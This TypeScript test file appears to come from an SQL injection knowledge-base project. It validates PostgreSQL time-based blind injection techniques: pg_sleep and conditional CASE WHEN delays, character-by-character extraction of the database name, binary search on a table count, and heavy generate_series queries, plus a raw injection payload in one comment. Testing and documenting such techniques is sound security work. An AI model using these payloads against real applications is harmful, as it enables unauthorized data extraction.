/**
 * PostgreSQL Time-Based SQL Injection Tests
 *
 * These tests validate timing-based blind SQL injection techniques
 * documented in the SQL Injection Knowledge Base.
 *
 * @kb-coverage postgresql/timing - Full coverage
 * @kb-coverage postgresql/conditional-statements - Partial (CASE WHEN with timing)
 */

import { describe, test, expect, beforeAll, afterAll } from "vitest";
import { initDirectRunner, cleanupDirectRunner, directSQL } from "../../src/runner/direct.js";
import { isDelayDetected } from "../../src/utils/timing.js";
import { logger } from "../../src/utils/logger.js";

// Shorter delay for faster tests, but still detectable
const TEST_DELAY_SECONDS = 2;
const TEST_DELAY_MS = TEST_DELAY_SECONDS * 1000;
const TOLERANCE_MS = 300;

describe("PostgreSQL Timing Attacks", () => {
  beforeAll(async () => {
    logger.setLevel("warn");
    await initDirectRunner();
  }, 30000);

  afterAll(async () => {
    await cleanupDirectRunner();
  }, 10000);

  /**
   * @kb-entry postgresql/timing
   * @kb-section pg_sleep() Timing Attack
   */
  describe("pg_sleep() basic functionality", () => {
    test("pg_sleep() delays execution by specified seconds", async () => {
      const { timing } = await directSQL(`SELECT pg_sleep(${TEST_DELAY_SECONDS})`);

      expect(isDelayDetected(timing.durationMs, TEST_DELAY_MS, TOLERANCE_MS)).toBe(true);
      expect(timing.durationMs).toBeGreaterThanOrEqual(TEST_DELAY_MS - TOLERANCE_MS);
    });

    test("pg_sleep(0) returns immediately", async () => {
      const { timing } = await directSQL("SELECT pg_sleep(0)");

      expect(timing.durationMs).toBeLessThan(500);
    });
  });

  /**
   * @kb-entry postgresql/timing
   * @kb-section Conditional Timing Attack
   * @kb-entry postgresql/conditional-statements
   * @kb-section CASE WHEN ... THEN ... END
   */
  describe("Conditional timing injection", () => {
    test("CASE WHEN with true condition triggers delay", async () => {
      const sql = `SELECT CASE WHEN (1=1) THEN pg_sleep(${TEST_DELAY_SECONDS}) END`;
      const { timing } = await directSQL(sql);

      expect(isDelayDetected(timing.durationMs, TEST_DELAY_MS, TOLERANCE_MS)).toBe(true);
    });

    test("CASE WHEN with false condition returns immediately", async () => {
      const sql = `SELECT CASE WHEN (1=2) THEN pg_sleep(${TEST_DELAY_SECONDS}) END`;
      const { timing } = await directSQL(sql);

      expect(timing.durationMs).toBeLessThan(500);
    });

    test("AND condition for boolean extraction", async () => {
      // Simulates: ' AND CASE WHEN (condition) THEN pg_sleep(2) ELSE pg_sleep(0) END--
      const sqlTrue = `SELECT 1 WHERE 1=1 AND (SELECT CASE WHEN (1=1) THEN pg_sleep(${TEST_DELAY_SECONDS}) END) IS NOT NULL`;
      const { timing: timingTrue } = await directSQL(sqlTrue);

      const sqlFalse = `SELECT 1 WHERE 1=1 AND (SELECT CASE WHEN (1=2) THEN pg_sleep(${TEST_DELAY_SECONDS}) END) IS NOT NULL`;
      const { timing: timingFalse } = await directSQL(sqlFalse);

      // True condition should delay, false should not
      expect(timingTrue.durationMs).toBeGreaterThan(timingFalse.durationMs + 1000);
    });
  });

  /**
   * @kb-entry postgresql/timing
   * @kb-section Data Extraction via Timing
   */
  describe("Data extraction via timing", () => {
    test("Extract first character of database name", async () => {
      // First, get the actual first character
      const { result: dbResult } = await directSQL("SELECT current_database()");
      const dbName = (dbResult?.rows[0] as { current_database: string } | undefined)
        ?.current_database;

      expect(dbName).toBeDefined();

      if (!dbName) return;

      const firstChar = dbName[0];

      // Test correct character - should delay
      const sqlCorrect = `SELECT CASE WHEN (SUBSTRING(current_database(),1,1)='${firstChar}') THEN pg_sleep(${TEST_DELAY_SECONDS}) END`;
      const { timing: timingCorrect } = await directSQL(sqlCorrect);

      // Test incorrect character - should not delay
      const wrongChar = firstChar === "a" ? "b" : "a";
      const sqlWrong = `SELECT CASE WHEN (SUBSTRING(current_database(),1,1)='${wrongChar}') THEN pg_sleep(${TEST_DELAY_SECONDS}) END`;
      const { timing: timingWrong } = await directSQL(sqlWrong);

      expect(isDelayDetected(timingCorrect.durationMs, TEST_DELAY_MS, TOLERANCE_MS)).toBe(true);
      expect(timingWrong.durationMs).toBeLessThan(1000);
    });

    test("Binary search for numeric values", async () => {
      // Get user count
      const { result: countResult } = await directSQL("SELECT COUNT(*) as cnt FROM users");
      const userCount = (countResult?.rows[0] as { cnt: string } | undefined)?.cnt;

      expect(userCount).toBeDefined();

      if (!userCount) return;

      const count = parseInt(userCount, 10);

      // Test: count > 0 (should be true, delay)
      const sqlGreaterThanZero = `SELECT CASE WHEN ((SELECT COUNT(*) FROM users) > 0) THEN pg_sleep(${TEST_DELAY_SECONDS}) END`;
      const { timing: timingGtZero } = await directSQL(sqlGreaterThanZero);

      // Test: count > 1000 (should be false, no delay)
      const sqlGreaterThan1000 = `SELECT CASE WHEN ((SELECT COUNT(*) FROM users) > 1000) THEN pg_sleep(${TEST_DELAY_SECONDS}) END`;
      const { timing: timingGt1000 } = await directSQL(sqlGreaterThan1000);

      expect(isDelayDetected(timingGtZero.durationMs, TEST_DELAY_MS, TOLERANCE_MS)).toBe(true);
      expect(timingGt1000.durationMs).toBeLessThan(1000);

      // Verify the actual count matches
      expect(count).toBeGreaterThan(0);
      expect(count).toBeLessThan(1000);
    });
  });

  /**
   * @kb-entry postgresql/timing
   * @kb-section Heavy Query Timing (Alternative to pg_sleep)
   */
  describe("Heavy query timing (without pg_sleep)", () => {
    test("generate_series creates measurable delay", async () => {
      // Large series generation causes CPU delay
      const sql = "SELECT COUNT(*) FROM generate_series(1, 5000000)";
      const { timing } = await directSQL(sql);

      // Should take at least 100ms for 5 million iterations
      expect(timing.durationMs).toBeGreaterThan(100);
    });

    test("Conditional heavy query for blind extraction", async () => {
      const sqlTrue = `SELECT CASE WHEN (1=1) THEN (SELECT COUNT(*) FROM generate_series(1,5000000)) END`;
      const { timing: timingTrue } = await directSQL(sqlTrue);

      const sqlFalse = `SELECT CASE WHEN (1=2) THEN (SELECT COUNT(*) FROM generate_series(1,5000000)) END`;
      const { timing: timingFalse } = await directSQL(sqlFalse);

      // True condition should take significantly longer
      expect(timingTrue.durationMs).toBeGreaterThan(timingFalse.durationMs);
    });
  });
});
